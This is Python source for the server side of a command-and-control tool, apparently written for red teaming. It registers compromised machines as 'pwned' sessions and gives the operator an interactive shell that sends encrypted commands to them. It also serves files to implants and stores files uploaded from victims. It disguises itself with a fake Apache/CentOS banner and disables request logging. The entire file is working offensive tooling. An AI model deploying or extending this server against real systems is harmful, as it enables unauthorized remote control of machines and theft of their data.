#!/bin/python3
"""
C2 Server side code
"""
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import unquote_plus
from crypt import cipher
from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, INPUT_TIMEOUT, KEEP_ALIVE_CMD,\
    CWD_RESPONSE, FILE_REQUEST, ZIP_PASSWORD, FILE_SEND, STORAGE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode, C2Commands
from inputimeout import inputimeout, TimeoutOccurred
from os import mkdir, path

def get_new_session():
    """ This function check if other sessions exists. If none re-initialize variables. However, if sessions do exist,
    allow the red teamer to pick one to become a new active session. """
    global active_session, pwned_dict, pwned_id, cwd

    cwd = "~"
    # if dict empty, re-init vars to their starting val
    if len(pwned_dict) == 1:
        print("Waiting for new connection")
        pwned_dict = {}
        pwned_id = 0
        active_session = 1
    else:
        while True:
            # display sessions in dict to switch a new active one.
            # print(*pwned_dict.items(), sep="\n")
            for key, value in pwned_dict.items():
                if key != active_session:
                    print(key, "-", value)
            try:
                new_session = int(input("\nChoose a session nbr to make active: "))
            except ValueError:
                print("\nYou must choose a pwnd id in one the session shown on screen.\n")
                continue

            if new_session in  pwned_dict and new_session != active_session:
                old_active_session = active_session
                active_session = new_session
                del pwned_dict[old_active_session]
                print(f"\nActive session is now: {pwned_dict[active_session]}")
                break
            else:
                print("\nYou must choose a pwnd id in one the session shown on screen.\n")
                continue


class C2Handler(BaseHTTPRequestHandler):
    """ This is a child class of the BaseHTTPRequestHandler class.
    It handles all HTTP request of our C2 server. """
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"
    
    # noinspection PyPep8Naming
    def do_GET(self):
        global active_session, client_account, client_hostname, pwned_id, pwned_dict

        # compromised computer request exfiltrate datas
        if self.path.startswith(CMD_REQUEST):
            # split client infos from GET initial request
            client = self.path.split(CMD_REQUEST)[1]
            client = cipher.decrypt(client.encode()).decode() # decoder 
            client_account = client.split('@')[0]
            client_hostname = client.split('@')[1]
            
            # client not into our pwned_dict yet
            if client not in pwned_dict.values():
                self.http_response(HTTPStatusCode.NOT_FOUND.value)

                pwned_id += 1
                pwned_dict[pwned_id] = client

                print(f"{client_account}@{client_hostname} has been pwned!\n")

            # interactive session with client
            elif client == pwned_dict[active_session]:
                if INPUT_TIMEOUT:
                    # Azure kills waiting HTTP GET session after 4 min, so must handle input with a timeout
                    try:
                        cmd = inputimeout(prompt=f"{client_account}@{client_hostname}:{cwd}$ ", timeout=INPUT_TIMEOUT)
                    except TimeoutOccurred:
                        cmd = KEEP_ALIVE_CMD
                else:
                    cmd = input("{client_account}@{client_hostname}:{cwd}$ ")

                if cmd.startswith(C2Commands.SERV.value): # server cmd for infos about target systems 
                    if cmd.startswith(C2Commands.SERV_SH_CLS.value):
                        print("Available pwned systems:")
                        print_last = None
                        for key, value in pwned_dict.items():
                            if key == active_session:
                                print_last = str(key) + " - " + value
                            else:
                                print(key, "-", value)
                        print("\nYour active session:", print_last, sep="\n")
                    elif cmd.startswith(C2Commands.SERV_CTRL.value):
                        pass
                else:        
                    try:
                        self.http_response(HTTPStatusCode.OK.value)
                        # passing back command to client; must be utf-8 encode
                        self.wfile.write(cipher.encrypt(cmd.encode()))
                    except BrokenPipeError as e:
                        print(f"Lost connection to {pwned_dict[active_session]}.\n")
                        get_new_session()
                    else:
                        if cmd.startswith("client kill"):
                            get_new_session()
                    

            # if client is in pwned_dict but is not our active session
            else:
                # first send back 404 to the client
                self.http_response(HTTPStatusCode.NOT_FOUND.value)
        elif self.path.startswith(FILE_REQUEST):
            filepath = self.path.split(FILE_REQUEST)[1]
            filepath = cipher.decrypt(filepath.encode()).decode()
            try:
                with open(f"{filepath}", "rb") as file_handle:
                    self.http_response(HTTPStatusCode.OK.value)
                    self.wfile.write(cipher.encrypt(file_handle.read()))
            except (FileNotFoundError, OSError):
                print(f"{filepath} was not found on the c2 server.")
                self.http_response(HTTPStatusCode.NOT_FOUND)

    def do_POST(self):
        if self.path == RESPONSE_PATH:
            print(self.handle_post_data())
        elif self.path == CWD_RESPONSE:
            # change path display into terminal to locate current dir
            global cwd
            cwd = self.handle_post_data()
        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP POST. Why ?\n")
    
    def do_PUT(self):
        if self.path.startswith(FILE_SEND + "/"):
            self.http_response(HTTPStatusCode.OK.value)
            filename = self.path.split(FILE_SEND + "/")[1]
            filename = cipher.decrypt(filename.encode()).decode()
            incoming_file = STORAGE + "/" + filename
            file_length = int(self.headers["Content-Length"])
            with open(incoming_file, 'wb') as file_handle:
                file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
            print(f"{incoming_file} has been written in c2 server")
        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP PUT. why ?\n")

                
    def handle_post_data(self):
        self.http_response(HTTPStatusCode.OK.value)
        content_length = int(self.headers.get("Content-Length"))
        # Gather the client's data by reading in the HTTP POST data
        client_data = self.rfile.read(content_length)
        # UTF-8 decode the client's data
        client_data = client_data.decode()
        client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)
        client_data = unquote_plus(client_data)
        client_data = cipher.decrypt(client_data.encode()).decode() # decoder 
        return client_data

    def http_response(self, code: int):
        self.send_response(code)
        self.end_headers()

    
    def log_request(self, code = "-", size = "-"):
        """ rewrite log to just keep interesting datas into c2 request tracks """
        return 

active_session = 1
cwd = "~"
client_account = ""
client_hostname = ""
pwned_id = 0
pwned_dict = {}

if not path.isdir(STORAGE):
    mkdir(STORAGE)

print("server version:", C2Handler.server_version)
print("sys_version:", C2Handler.sys_version)

server = ThreadingHTTPServer((BIND_ADDR, PORT), C2Handler)
server.serve_forever()
# def run(server_class=HTTPServer, handler_class=BHTTPR):
#     server_address = ('', 8900)
#     httpd = server_class(server_address, handler_class)
#     httpd.serve_forever()